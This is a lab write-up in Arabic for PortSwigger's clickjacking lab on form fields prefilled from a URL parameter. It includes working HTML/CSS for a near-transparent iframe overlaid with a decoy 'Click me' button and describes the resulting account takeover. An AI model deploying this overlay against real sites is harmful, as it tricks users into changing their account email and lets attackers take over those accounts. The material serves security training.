# Lab : Clickjacking with form input data prefilled from a URL parameter

https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input

- الفكره من ال Lab ده انك عاوزين تغير الemail بس عنطريق نخلي التارجت هو الي يعمل الaction وعلشان نعمل كده هنعمل صفحه احنا الي عاملينها تظهر علي الصفحه الرايسيه والتارحت هيكون مفكر نفسه بيعمل حاجه بس هو بيغير الemail بايده

```bash
1. <style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:490px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a14004e037d75b080c32b0a00a800dd.web-security-academy.net/my-account?email=test6@test.CA"></iframe>
```

## الفكرة العامة من الـ Lab ده

اللاب اسمه **"Clickjacking with form input data prefilled from a URL parameter"** وهو بيوضح إزاي ثغرة الـ Clickjacking ممكن تتظبط عشان تستغل form فيه حقل بيتملى تلقائي (prefilled) من قيمة موجودة في الـ URL.

### السيناريو

في صفحة "My Account" فيها فورم بسيط لتغيير الإيميل، والفورم ده فيه زرار "Submit" (أو "Update email"). المهم إن:

1. **حقل الإيميل ده ممكن يتملى تلقائيًا (prefilled)** لو حطيت قيمة في الـ query parameter بتاعة الـ URL، مثلاً:

```
https://vulnerable-website.com/my-account?email=hacker@evil-user.net
```

لو المستخدم فاتح اللينك ده وهو داخل بالفعل (logged in)، هيلاقي خانة الإيميل اتملت تلقائي بالقيمة اللي في الرابط.

1. **الصفحة مفيهاش حماية من الـ framing** — يعني مفيش `X-Frame-Options` header ولا `frame-ancestors` في الـ CSP، فتقدر تحطها جوه `<iframe>` عادي من موقع تاني من غير ما الموقع يمنعك.

### الفكرة الأساسية للهجوم

بما إن الحقل بيتملى من الـ URL، الهاكر يقدر:

1. يبني صفحة عندها فيها `iframe` بيحمّل صفحة الـ "My Account" مع الـ email parameter اللي هو عايزه (إيميل بتاعه هو):

html

```html
<iframe src="https://vulnerable-website.com/my-account?email=hacker@evil-user.net"></iframe>
```

1. يستخدم CSS عشان يخفي الـ iframe أو يخليه شفاف تمامًا (`opacity: 0`) ويحط زرار وهمي فوقه بالظبط مكان زرار "Update email" الحقيقي، باستخدام تقنية الـ **overlay** المعروفة في الـ clickjacking.
2. لما الضحية (وهو داخل حسابه بالفعل - logged in) يدوس على الزرار الوهمي ظانًا إنه بيعمل حاجة تانية (زي "Click here to win a prize")، هو فعليًا بيدوس على زرار "Update email" الحقيقي جوه الـ iframe المخفي.
3. النتيجة: إيميل حساب الضحية بيتغير لإيميل الهاكر **من غير ما الضحية يحس** — وبكده الهاكر يقدر يعمل "Forgot password" على الإيميل الجديد ويستولي على الحساب بالكامل (Account Takeover).

### أهمية اللاب

اللاب ده بيوضح إن الـ Clickjacking مش بس "خدع المستخدم إنه يدوس زرار"، لكنه ممكن يتطور لحاجة أخطر لما تتجمع مع ميزة تانية زي الـ **prefilled form fields من الـ URL** — الجمع بين الاتنين بيدي الهاكر قدرة إنه يتحكم في **المحتوى** اللي هيتبعت (مش بس التفاعل)، وده بيفرق كتير عن الـ clickjacking العادي اللي بس بيخلي المستخدم يدوس زرار موجود بقيمة ثابتة.
